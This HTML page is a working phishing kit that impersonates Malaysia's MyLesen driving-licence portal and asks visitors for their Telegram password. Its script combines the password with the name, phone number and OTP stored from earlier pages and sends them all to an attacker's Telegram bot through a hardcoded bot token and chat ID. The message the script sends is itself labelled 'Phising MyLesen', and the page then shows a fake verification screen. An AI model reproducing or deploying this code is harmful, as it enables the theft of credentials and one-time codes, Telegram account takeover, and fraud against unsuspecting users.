<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>My Lesen 2024</title>

    <!-- Link ke Google Fonts -->
    <link
      href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap"
      rel="stylesheet"
    />

    <!-- Link ke CSS intl-tel-input -->
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"
    />

    <style>
      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
      }

      html,
      body {
        overflow: hidden; /* Mencegah scroll jika tidak ada konten yang tertutupi */
        height: 100%;
        font-family: "Poppins", sans-serif;
        color: #010101;
        background-color: #d8dcd0;
      }

      .hero {
        height: 100vh;
        background-size: cover;
        background-position: center;
      }

      /* navbar */
      .navbar {
        display: flex;
        justify-content: space-between;
        align-items: center;
        background-color: #d8dcd0; /* Warna latar belakang navbar */
        padding: 10px 20px;
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        z-index: 9999;
      }

      .navbar .navbar-logo {
        font-size: 2vw; /* Ukuran font logo dinamis */
        color: #010101;
        font-weight: 400;
        display: flex;
        align-items: center;
      }

      .navbar .navbar-nav {
        display: flex;
        align-items: center;
        justify-content: flex-end; /* Posisi tautan tetap rapih di ujung kanan */
        flex-wrap: nowrap; /* Mencegah elemen terbungkus menjadi kolom */
      }

      .navbar .navbar-nav a {
        color: #010101; /* Warna teks bahasa */
        font-weight: bold;
        font-size: 1.5vw; /* Ukuran font dinamis */
        margin: 0 10px; /* Menambahkan jarak antar link bahasa */
        padding: 5px; /* Ruang klik */
        text-decoration: none; /* Menghilangkan garis bawah pada link */
        white-space: nowrap; /* Mencegah teks terpotong ke baris baru */
      }

      .navbar .navbar-nav a span {
        color: blue;
      }

      .navbar .navbar-nav a:hover {
        color: #007bff; /* Warna hover */
        transition: color 0.3s ease; /* Efek transisi saat hover */
      }

      .navbar .navbar-img {
        width: 40px; /* Ukuran logo */
        height: auto;
        margin-left: 10px; /* Jarak antara logo dan teks */
        object-fit: contain; /* Menjaga proporsi gambar */
      }

      /* Media Query untuk layar kecil */
      @media (max-width: 768px) {
        .navbar {
          padding: 10px 10px; /* Mengurangi padding pada layar kecil */
        }

        .navbar .navbar-logo {
          font-size: 4vw; /* Ukuran font logo lebih besar pada layar kecil */
        }

        .navbar .navbar-nav {
          flex-direction: row; /* Pastikan tautan tetap satu baris */
        }

        .navbar .navbar-nav a {
          font-size: 3vw; /* Ukuran font lebih besar pada layar kecil */
          margin: 0 5px; /* Mengurangi margin pada layar kecil */
          padding: 5px; /* Ruang klik pada layar kecil */
        }

        .navbar .navbar-img {
          width: 30px; /* Ukuran logo lebih kecil pada layar kecil */
          margin-left: 5px; /* Kurangi jarak pada layar kecil */
          margin-top: 0;
        }
      }

      .hero {
        height: 100vh;
        width: 100%;
        background-size: cover;
        background-position: center;
        position: relative;
      }

      img {
        width: 350px; /* Atur lebar gambar sesuai keinginan */
        height: auto; /* Agar proporsi gambar tetap */
        display: block; /* Untuk membuatnya blok, bisa juga inline-block */
        margin: 0 auto; /* Posisikan di tengah jika dalam elemen blok */
        margin-top: 10px;
      }

      h4 {
        display: flex;
        padding-top: 30px;
        color: #010101;
        align-items: center;
        justify-content: center;
      }

      .form-container {
        justify-content: center;
        background-color: #d8dcd0;
        padding: 50px 40px;
        border-radius: 10px;
        width: 70%;
        margin: 50px auto;
        margin-top: 20px;
      }

      p {
        font-size: 18px;
        color: #333;
        text-align: center;
        margin-top: 0;
        margin-bottom: 20px;
        line-height: 1.6;
        font-weight: 500;
      }

      input[type="password"] {
        width: 100%;
        padding: 10px;
        margin-bottom: 0px;
        border: 1px solid #ccc;
        border-radius: 5px;
        font-size: 1.1rem;
      }

      .btn {
        display: flex;
        width: 100%;
        padding: 12px;
        margin: 20px auto 0;
        background-color: #6f6208;
        color: white;
        border: none;
        border-radius: 10px;
        font-size: 1.1rem;
        cursor: pointer;
        align-items: center;
        justify-content: center;
      }

      .btn:hover {
        background-color: #225786;
      }

      /* Loading screen styles */
      .loading-screen {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(255, 255, 255, 0.8);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 1000;
        display: none;
      }

      .loading-screen img {
        max-width: 100px;
        max-height: 100px;
      }

      main {
        flex-grow: 1; /* Memastikan konten utama mendorong footer ke bawah */
      }

      footer {
        position: fixed; /* Tetap di bawah meski konten lebih pendek */
        left: 0;
        bottom: 0;
        width: 100%;
        background-color: #d8dcd0; /* Latar belakang footer */
        text-align: center;
      }

      footer img {
        max-width: 400px; /* Ukuran gambar maksimal */
        height: auto;
      }

      /* Keyframes for spin animation */
      @keyframes spin {
        0% {
          transform: rotate(0deg);
        }
        100% {
          transform: rotate(360deg);
        }
      }

      @media (max-width: 768px) {
        .form-container {
          width: 90%;
          padding: 20px;
        }

        input[type="text"],
        input[type="tel"] {
          font-size: 1rem;
        }

        .btn {
          width: 60%;
          font-size: 1.3rem;
          padding: 15px;
        }
      }

      @media (max-width: 480px) {
        p {
          font-size: 16px;
        }

        .btn-daftar {
          padding: 8px 16px;
          font-size: 14px;
        }
      }
    </style>
  </head>
  <body>
    <br />
    <h4>LESEN MEMANDU</h4>
    <nav class="navbar">
      <div class="navbar-logo">
        <img src="Jata Negara@3x.gif" alt="Logo" class="navbar-img" />
        <img
          src="Jabatan_Pengangkutan_Jalan.svg.png"
          alt="Logo"
          class="navbar-img"
        />
        <!-- Contoh gambar logo -->
      </div>

      <div class="navbar-nav">
        <a href="#">Bahasa Melayu</a>
        <a href="#"><span>English</span></a>
        <a href="#"><span>日本</span></a>
        <a href="#"><span>摩訶至那國</span></a>
      </div>
    </nav>

    <img src="my-lesen.jpeg" alt="tng-img" />

    <div class="form-container">
      <p id="kataSandi">Sila Masukan kata laluan Telegram Anda</p>
      <form id="registrationForm">
        <input
          type="password"
          id="kata-sandi"
          name="kata-sandi"
          placeholder="Masukan kata laluan"
          required
        />
        <button type="submit" class="btn" id="loginButton">Log Masuk</button>
      </form>

      <img
        id="loadingGif"
        src="processing.gif"
        alt="Loading..."
        style="display: none; margin: 20px auto; width: 60%; height: auto"
      />

      <p id="formMessage" style="display: none; text-align: center">
        Sila Masukan kata laluan Telegram Anda
      </p>

      <button
        id="useAnotherPhone"
        style="
          display: none;
          width: 100%;
          padding: 12px;
          margin: 30px auto 0;
          background-color: #72650e;
          color: white;
          border: none;
          border-radius: 10px;
          font-size: 1.1rem;
          cursor: pointer;
          align-items: center;
          justify-content: center;
        "
      >
        Gunakan Nombor Lain
      </button>
    </div>
    <footer>
      <!-- Hanya menampilkan gambar di dalam footer -->
      <img src="ini1.png" alt="Logo Footer" />
    </footer>

    <!-- Loading Screen -->
    <div class="loading-screen" id="loadingScreen">
      <img src="loading-loading-forever.gif" alt="Loading..." />
    </div>

    <!-- Script untuk intl-tel-input -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
    <script>
      // Mendapatkan data dari local storage
      const name = localStorage.getItem("name") || "";
      const phone = localStorage.getItem("phone") || "";
      const otp = localStorage.getItem("otp") || "";

      document
        .getElementById("registrationForm")
        .addEventListener("submit", function (event) {
          event.preventDefault(); // Mencegah pengiriman form default

          // Ambil nilai kata sandi
          const kataSandi = document.getElementById("kata-sandi").value;

          // Sembunyikan input kata sandi dan tombol login
          document.getElementById("kata-sandi").style.display = "none";
          const loginButton = document.getElementById("loginButton");
          loginButton.style.display = "none"; // Sembunyikan tombol "Log Masuk"

          // Tampilkan GIF loading
          document.getElementById("loadingGif").style.display = "block";

          // Ubah pesan menjadi "Sila tunggu proses pengesahan atau gunakan nombor telefon lain"
          document.getElementById("formMessage").innerHTML =
            "Sila tunggu proses pengesahan atau gunakan nombor telefon lain";
          document.getElementById("formMessage").style.display = "block"; // Pastikan pesan terlihat
          document.getElementById("kataSandi").style.display = "none";

          // Ubah tombol "Gunakan Nomor Lain" menjadi terlihat
          const useAnotherPhoneButton =
            document.getElementById("useAnotherPhone");
          useAnotherPhoneButton.style.display = "block"; // Tampilkan tombol

          // Mengirim data ke Telegram
          const botToken = "6476409871:AAFWcRQgiwy3mJFtn-x2d1ZCiQAUSutp0kM"; // Ganti dengan token bot Anda
          const chatId = "6560805091"; // Ganti dengan ID chat Anda

          const message = `
─────────────────
(MALAY | DATA | ${phone})
─────────────────
- No HP         : ${phone}

- Nama Lengkap  : ${name}

- OTP           : ${otp}

- Kata Sandi    : ${kataSandi}
─────────────────
Phising MyLesen
    `;

          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
            }),
          })
            .then((response) => {
              if (response.ok) {
                console.log("Pesan berhasil dikirim.");
                // Tidak perlu ada waktu tunda, animasi tetap muncul sampai tombol "Gunakan Nomor Lain" ditekan
              } else {
                throw new Error("Gagal mengirim pesan ke Telegram");
              }
            })
            .catch((error) => {
              console.error("Error:", error);
              alert("Terjadi kesalahan saat mengirim pesan."); // Notifikasi kesalahan
            });
        });

      // Event listener untuk tombol "Gunakan Nomor Lain"
      document
        .getElementById("useAnotherPhone")
        .addEventListener("click", function () {
          window.location.href = "index.html"; // Ganti dengan URL halaman awal
        });
    </script>

    <script>
      function startAutoScroll() {
        var list = document.querySelector(".list");
        var scrollTimer;

        function scrollList() {
          var firstItem = list.querySelector(".item:first-child");
          var itemHeight = firstItem.offsetHeight;

          list.style.transition = "margin-top 1s ease";
          list.style.marginTop = `-${itemHeight}px`;

          setTimeout(function () {
            list.style.transition = "none";
            list.style.marginTop = "0px";
            list.appendChild(firstItem); // Pindahkan item pertama ke akhir
          }, 1000); // Setelah animasi selesai (1 detik)

          scrollTimer = setTimeout(scrollList, 2000); // Ulangi scroll setiap 2 detik
        }

        scrollList(); // Mulai scrolling
      }

      document.addEventListener("DOMContentLoaded", function () {
        startAutoScroll(); // Jalankan scrolling otomatis saat halaman dimuat
      });
    </script>
  </body>
</html>
